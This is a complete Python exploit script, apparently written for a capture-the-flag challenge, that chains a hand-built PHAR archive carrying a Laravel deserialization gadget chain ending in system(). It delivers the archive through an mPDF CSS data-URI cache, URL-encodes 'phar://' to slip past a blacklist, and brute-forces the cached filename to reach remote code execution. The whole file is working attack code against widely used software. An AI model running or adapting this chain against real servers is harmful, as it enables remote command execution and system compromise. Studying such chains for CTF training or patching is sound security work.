#!/usr/bin/env python3
"""
15 - mPDF PHAR kill chain.

Stages:
  1. build a PHAR archive byte-by-byte (stub / manifest / entries / signature)
     whose serialized metadata is a real Laravel POP chain
     (Illuminate\\Broadcasting\\PendingBroadcast -> Illuminate\\Bus\\Dispatcher
      -> call_user_func('system', $cmd)), i.e. PHPGGC's Laravel/RCE6;
  2. smuggle it onto the server as a base64 `data:` URI inside a CSS rule -
     mPDF's CssManager caches every CSS data URI to
     <tempDir>/mpdf/_tempCSSidata<random_int(1,10000)>_<i>.<ext>;
  3. brute-force that 1-in-10000 filename with <img ORIG_SRC="phar://...">
     tags, which mPDF 8.0.10 feeds to fopen() without a stream-wrapper check;
  4. PHP 7.4 unserializes the PHAR metadata -> __destruct -> system().

Python 3 standard library only.
"""

import base64
import hashlib
import re
import struct
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://challenge").rstrip("/")

# mPDF default: <mpdf package>/tmp, and Mpdf\ServiceFactory appends '/mpdf'.
DEFAULT_CACHE_DIR = "/var/www/app/vendor/mpdf/mpdf/tmp/mpdf"

# CssManager.php (v8.0.10, line 229):
#   $file = $this->cache->write('_tempCSSidata' . random_int(1, 10000)
#                               . '_' . $i . '.' . $idata[2][$i], ...);
RAND_MIN, RAND_MAX = 1, 10000
CHUNK = 2500                       # candidates probed per HTTP request

COMMAND = "/usr/local/bin/readflag /flag.txt"


# --------------------------------------------------------------------------
# stage 0 - PHP serialization helpers
# --------------------------------------------------------------------------
def php_str(value) -> bytes:
    raw = value.encode() if isinstance(value, str) else value
    return b's:%d:"%s";' % (len(raw), raw)


def php_protected(name: str) -> bytes:
    """A `protected` property key is mangled to "\\0*\\0<name>"."""
    return php_str(b"\x00*\x00" + name.encode())


def php_object(cls: str, props) -> bytes:
    body = b"".join(key + val for key, val in props)
    return b'O:%d:"%s":%d:{%s}' % (len(cls), cls.encode(), len(props), body)


def laravel_rce6(command: str) -> bytes:
    """
    PHPGGC `Laravel/RCE6`, built by hand:

        Illuminate\\Broadcasting\\PendingBroadcast::__destruct()
            -> $this->events->dispatch($this->event)
        Illuminate\\Bus\\Dispatcher::dispatch($command)
            -> $command instanceof ShouldQueue && $this->queueResolver
            -> dispatchToQueue($command)
            -> call_user_func($this->queueResolver, $command->connection)

    BroadcastEvent implements ShouldQueue and inherits the public $connection
    property from the Queueable trait, so the call becomes system($command).
    """
    dispatcher = php_object(
        "Illuminate\\Bus\\Dispatcher",
        [(php_protected("queueResolver"), php_str("system"))],
    )
    event = php_object(
        "Illuminate\\Broadcasting\\BroadcastEvent",
        [(php_str("connection"), php_str(command))],
    )
    return php_object(
        "Illuminate\\Broadcasting\\PendingBroadcast",
        [(php_protected("events"), dispatcher), (php_protected("event"), event)],
    )


# --------------------------------------------------------------------------
# stage 1 - a PHAR archive, assembled from scratch
# --------------------------------------------------------------------------
STUB = b"<?php __HALT_COMPILER(); ?>\r\n"


def build_phar(metadata: bytes, files=None, alias: bytes = b"") -> bytes:
    """
    layout:  <stub> <manifest length> <manifest> <file bodies> <signature>

    manifest:  u32 file count | u16 API version (BIG endian!) | u32 global flags
               u32 alias length + alias | u32 metadata length + metadata
               | per-file entries

    entry:     u32 name length + name | u32 size | u32 mtime | u32 packed size
               u32 crc32 | u32 flags (unix perms in the low bits)
               | u32 per-file metadata length

    trailer:   <digest> | u32 signature type | "GBMB"
    """
    if files is None:
        files = {"a.jpg": b"\xff\xd8\xff\xe0JFIF"}

    entries, bodies = b"", b""
    for name, content in files.items():
        raw = name.encode()
        entries += struct.pack("<I", len(raw)) + raw
        entries += struct.pack("<I", len(content))                    # size
        entries += struct.pack("<I", 0)                               # mtime
        entries += struct.pack("<I", len(content))                    # packed
        entries += struct.pack("<I", zlib.crc32(content) & 0xFFFFFFFF)
        entries += struct.pack("<I", 0x000001B6)                      # 0666
        entries += struct.pack("<I", 0)                               # metadata
        bodies += content

    manifest = struct.pack("<I", len(files))
    # phar_parse_pharfile() reads this one as buffer[0] << 8 | buffer[1] and
    # rejects anything below 0x1000 with "manifest is too old".
    manifest += struct.pack(">H", 0x1100)
    manifest += struct.pack("<I", 0x00010000)                         # signed
    manifest += struct.pack("<I", len(alias)) + alias
    manifest += struct.pack("<I", len(metadata)) + metadata
    manifest += entries

    body = STUB + struct.pack("<I", len(manifest)) + manifest + bodies
    return body + hashlib.sha1(body).digest() + struct.pack("<I", 0x0002) + b"GBMB"


# --------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------
def http_get(path: str) -> bytes:
    with urllib.request.urlopen(BASE + path, timeout=30) as r:
        return r.read()


def http_post(html: str) -> bytes:
    data = urllib.parse.urlencode({"html": html}).encode()
    req = urllib.request.Request(BASE + "/", data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return r.read()
    except urllib.error.HTTPError as e:          # a fatal error still carries output
        return e.read()


# --------------------------------------------------------------------------
# payload assembly
# --------------------------------------------------------------------------
def plant_css(phar_b64: str) -> str:
    """CSS data URI -> CssManager caches it to a file we can phar:// into."""
    return ("<style>div.logo{background:url(data:image/jpeg;base64,"
            + phar_b64 + ");}</style>")


def probe_tags(cache_dir: str, lo: int, hi: int) -> str:
    """
    One <img> per candidate filename.

    * the SRC must be *different* for every tag, otherwise mPDF short-circuits
      on its $failedImages cache and only the first probe is ever attempted;
    * the wrapper is written `ph%61r://` - the app blacklists the literal
      string "phar://", but mPDF rawurldecodes ORIG_SRC before using it.
    """
    out = []
    for n in range(lo, hi + 1):
        out.append('<img src="#%d.jpg" ORIG_SRC="ph%%61r://%s/_tempCSSidata%d_0.jpeg/a.jpg">'
                   % (n, cache_dir, n))
    return "".join(out)


def discover_cache_dir() -> str:
    try:
        page = http_get("/").decode("utf-8", "replace")
    except Exception as exc:
        print("[!] could not read the landing page (%s), using the default" % exc)
        return DEFAULT_CACHE_DIR
    m = re.search(r"cache dir\s*:\s*(\S+)", page)
    if m:
        return m.group(1)
    m = re.search(r"app root\s*:\s*(\S+)", page)
    if m:
        return m.group(1) + "/vendor/mpdf/mpdf/tmp/mpdf"
    return DEFAULT_CACHE_DIR


def cache_entries() -> int:
    try:
        page = http_get("/").decode("utf-8", "replace")
        m = re.search(r"cache dir\s*:.*?\((\d+) entries\)", page)
        return int(m.group(1)) if m else -1
    except Exception:
        return -1


# --------------------------------------------------------------------------
def main() -> int:
    print("[*] target: " + BASE)

    cache_dir = discover_cache_dir()
    print("[*] mPDF cache directory: " + cache_dir)

    payload = laravel_rce6(COMMAND)
    # NUL bytes are the property-name mangling of `protected`; show them escaped
    print("[*] POP chain (%d bytes): %s"
          % (len(payload), payload.decode("latin1").replace("\x00", "\\0")))

    phar = build_phar(payload)
    phar_b64 = base64.b64encode(phar).decode()
    print("[*] PHAR built: %d bytes, %d bytes of base64" % (len(phar), len(phar_b64)))
    assert phar[:5] == b"<?php" and phar[-4:] == b"GBMB"

    # ---- empirical proof that the data URI really lands on disk -----------
    before = cache_entries()
    http_post("<h1>Quote</h1>" + plant_css(phar_b64))
    after = cache_entries()
    if before >= 0 and after > before:
        print("[+] the data URI landed on disk: mPDF's cache directory grew from "
              "%d to %d entries" % (before, after))
        print("    its name is _tempCSSidata<N>_0.jpeg with N drawn from "
              "random_int(%d, %d)" % (RAND_MIN, RAND_MAX))
    else:
        print("[*] cache directory entry count: %s -> %s" % (before, after))

    # ---- brute force ------------------------------------------------------
    # Every request re-plants a fresh copy (a new random_int draw) and probes
    # the next slice, so the very first plant is guaranteed to be covered
    # after ceil(10000 / CHUNK) requests.
    total = RAND_MAX - RAND_MIN + 1
    rounds = (total + CHUNK - 1) // CHUNK
    print("[*] search space: %d names, %d probes/request -> <= %d requests"
          % (total, CHUNK, rounds))

    flag_re = re.compile(rb"PHRACK\{[^}]*\}")
    for attempt in range(1, 3):
        for r in range(rounds):
            lo = RAND_MIN + r * CHUNK
            hi = min(lo + CHUNK - 1, RAND_MAX)
            html = ("<h1>Quote</h1>" + plant_css(phar_b64)
                    + probe_tags(cache_dir, lo, hi))
            t0 = time.time()
            body = http_post(html)
            hit = flag_re.search(body)
            print("[*] round %d/%d  candidates %d-%d  (%d KiB posted, %.1fs)%s"
                  % (r + 1, rounds, lo, hi, len(html) // 1024, time.time() - t0,
                     "  <-- HIT" if hit else ""))
            if hit:
                print("[+] PHAR metadata deserialized, POP chain executed "
                      "`%s` as the web user" % COMMAND)
                print("FLAG: " + hit.group(0).decode())
                return 0
        print("[!] pass %d found nothing, retrying" % attempt)

    print("[-] exploitation failed")
    return 1


if __name__ == "__main__":
    sys.exit(main())
